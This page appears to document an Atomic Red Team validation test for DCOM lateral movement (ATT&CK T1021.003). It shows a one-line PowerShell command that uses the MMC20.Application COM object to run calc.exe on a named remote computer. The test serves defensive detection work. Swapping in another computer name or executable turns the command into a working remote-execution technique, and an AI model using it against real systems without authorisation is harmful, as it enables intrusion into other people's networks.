---
atomic_guid: "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673"
title: "PowerShell Lateral Movement using MMC20"
framework: "atomic"
generated: "true"
attack_technique_id: "T1021.003"
attack_technique_name: "Remote Services: Distributed Component Object Model"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.yaml"
build_date: "2026-04-26 14:38:39"
executor: "powershell"
aliases:
  - "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673"
  - "PowerShell Lateral Movement using MMC20"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# PowerShell Lateral Movement using MMC20

Powershell lateral movement using the mmc20 application com object.

Reference:

https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

Upon successful execution, cmd will spawn calc.exe on a remote computer.

## Metadata

- Atomic GUID: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
- Technique: T1021.003: Remote Services: Distributed Component Object Model
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1021.003/T1021.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1021-remote_services|T1021.003]]

## Input Arguments

### computer_name

- description: Name of Computer
- type: string
- default: localhost

## Executor

- name: powershell

### Command

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.003/T1021.003.yaml)
